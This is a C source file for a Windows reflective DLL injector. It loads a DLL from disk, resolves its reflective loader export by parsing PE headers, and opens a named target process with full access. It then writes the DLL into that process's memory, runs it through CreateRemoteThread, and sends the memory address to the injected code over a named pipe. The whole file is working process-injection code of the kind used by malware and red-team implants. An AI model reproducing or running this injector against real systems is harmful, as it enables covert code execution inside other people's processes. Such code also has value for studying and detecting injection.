#include "Reflective-Inject.h"

#include <tlhelp32.h>




BOOL ReadReflectiveDll(IN LPWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pTmpReadBuffer = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	if (!pdwFileSize || !ppFileBuffer)
		return FALSE;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("\t[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!(pTmpReadBuffer = ALLOC(dwFileSize))) {
		printf("\t[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile Failed With Error: %d \n", GetLastError());
		printf("\t[i] ReadFile Read %d Of %d Bytes \n", dwNumberOfBytesRead, dwFileSize);
		goto _FUNC_CLEANUP;
	}

	*ppFileBuffer = pTmpReadBuffer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pTmpReadBuffer && !*ppFileBuffer)
		FREE(pTmpReadBuffer);
	return *ppFileBuffer == NULL ? FALSE : TRUE;
}

DWORD RVA2Offset(IN DWORD dwRVA, IN PBYTE pBaseAddress) {

	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
	PIMAGE_SECTION_HEADER	pImgSectionHdr = NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBaseAddress + ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)&pImgNtHdrs->OptionalHeader + pImgNtHdrs->FileHeader.SizeOfOptionalHeader);

	// Iterates through the PE sections
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// If the RVA is located inside the "i" PE section
		if (dwRVA >= pImgSectionHdr[i].VirtualAddress && dwRVA < (pImgSectionHdr[i].VirtualAddress + pImgSectionHdr[i].Misc.VirtualSize))
			// Calculate the delta and add it to the raw pointer
			return (dwRVA - pImgSectionHdr[i].VirtualAddress) + pImgSectionHdr[i].PointerToRawData;
	}

	printf("\t[!] Cound'nt Convert The 0x%0.8X RVA to File Offset! \n", dwRVA);
	return 0x00;
}

DWORD GetReflectiveFunctionOffset(IN ULONG_PTR uRflDllBuffer) {

	PIMAGE_NT_HEADERS			pImgNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDir = NULL;
	PDWORD						pdwFunctionNameArray = NULL;
	PDWORD						pdwFunctionAddressArray = NULL;
	PWORD						pwFunctionOrdinalArray = NULL;

	pImgNtHdrs = (uRflDllBuffer + ((PIMAGE_DOS_HEADER)uRflDllBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(uRflDllBuffer + RVA2Offset(pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, uRflDllBuffer));
	pdwFunctionNameArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNames, uRflDllBuffer));
	pdwFunctionAddressArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfFunctions, uRflDllBuffer));
	pwFunctionOrdinalArray = (PWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNameOrdinals, uRflDllBuffer));


	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		PCHAR pcFunctionName = (PCHAR)(uRflDllBuffer + RVA2Offset(pdwFunctionNameArray[i], uRflDllBuffer));

		if (strcmp(pcFunctionName, EXPORTED_FUNC_NAME) == 0)
			return RVA2Offset(pdwFunctionAddressArray[pwFunctionOrdinalArray[i]], uRflDllBuffer);
	}

	printf("\t[!] Cound'nt Resolve %s's Offset! \n", EXPORTED_FUNC_NAME);
	return 0x00;
}

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	PROCESSENTRY32	ProcEntry32 = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE			hSnapShot = NULL;

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!Process32First(hSnapShot, &ProcEntry32)) {
		printf("\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	do {

		if (ProcEntry32.szExeFile) {

			WCHAR	LowerName1[MAX_PATH * 2] = { 0x00 };
			WCHAR	LowerName2[MAX_PATH * 2] = { 0x00 };
			DWORD	dwSize = lstrlenW(ProcEntry32.szExeFile);
			DWORD   i = 0x00;

			if (dwSize * sizeof(WCHAR) < sizeof(LowerName1)) {
				for (i = 0x0; i < dwSize; i++)
					LowerName1[i] = (WCHAR)tolower(ProcEntry32.szExeFile[i]);

				LowerName1[i++] = L'\0';
			}

			if (lstrlenW(szProcessName) * sizeof(WCHAR) < sizeof(LowerName2)) {
				for (i = 0x00; i < dwSize; i++)
					LowerName2[i] = (WCHAR)tolower(szProcessName[i]);

				LowerName2[i++] = L'\0';
			}

			if (wcscmp(LowerName1, LowerName2) == 0) {
				*dwProcessId = ProcEntry32.th32ProcessID;
				if (!(*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry32.th32ProcessID))) {
					printf("\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
				}
				break;
			}

		}

	} while (Process32Next(hSnapShot, &ProcEntry32));

_FUNC_CLEANUP:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

#define PIPE_NAME "\\\\.\\pipe\\MyReflectivePipe"


BOOL InjectAndRunRflDll(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize) {

	PBYTE	pAddress = NULL;
	PVOID pRemoteData = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;
	HANDLE	hThread = NULL;
	DWORD	dwThreadId = 0x00;

	// <<!>> You may need RWX permissions for your payload
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
		printf("\t[!] DLL-VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Allocated Memory At: 0x%p \n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		printf("\t[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteProcessMemory Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, dwRflDllSize);
		return FALSE;
	}

	printf("\t[i] Thread Entry Calculated To Be: 0x%p \n", (PVOID)(pAddress + dwRflFuncOffset));


	printf("Ready to inject? <Press Enter>\n");
	getchar();

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		printf("\t[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	WaitForSingleObject(hThread, INFINITE);

	DWORD exitCode = 0;
	GetExitCodeThread(hThread, &exitCode);
	printf("\t[i] Thread Exit Code: %d\n", exitCode);

	CloseHandle(hThread);
	printf("\t[*] Executed \"%s\" Via Thread Of ID %d \n", EXPORTED_FUNC_NAME, dwThreadId);


	// Send shellcode memory address to DLL via pipe
	HANDLE hPipe;
	char buffer[512];
	DWORD bytesRead, bytesWritten;

	hPipe = CreateNamedPipeA(
		PIPE_NAME,                  
		PIPE_ACCESS_DUPLEX,         
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 
		1,                          
		512, 512,                  
		0, NULL                    
	);

	if (hPipe == INVALID_HANDLE_VALUE) {
		printf("[-] CreateNamedPipe failed: %d\n", GetLastError());
		return;
	}

	printf("[+] Waiting for connection...\n");

	// Wait for client connection

	while (!ConnectNamedPipe(hPipe, NULL)) {
		if (GetLastError() == ERROR_PIPE_CONNECTED) {
			break;
		}
		Sleep(100);
	}

	printf("[+] DLL Connected!\n");

	if (!WriteFile(hPipe, &dwRflDllSize, sizeof(DWORD), &bytesWritten, NULL)) {
		printf("[-] WriteFile dwRflDllSize failed: %d\n", GetLastError());
	}
	else {
		printf("[+] Send DWORD: %d to DLL。\n", dwRflDllSize);
	}

	if (!WriteFile(hPipe, &pAddress, sizeof(PVOID), &bytesWritten, NULL)) {
		printf("[-] WriteFile pAddress failed: %d\n", GetLastError());
	}
	else {
		printf("[+] Send PVOID: 0x%p to DLL。\n", pAddress);
	}

	FlushFileBuffers(hPipe);
	Sleep(5000);
	CloseHandle(hPipe);

	return TRUE;
}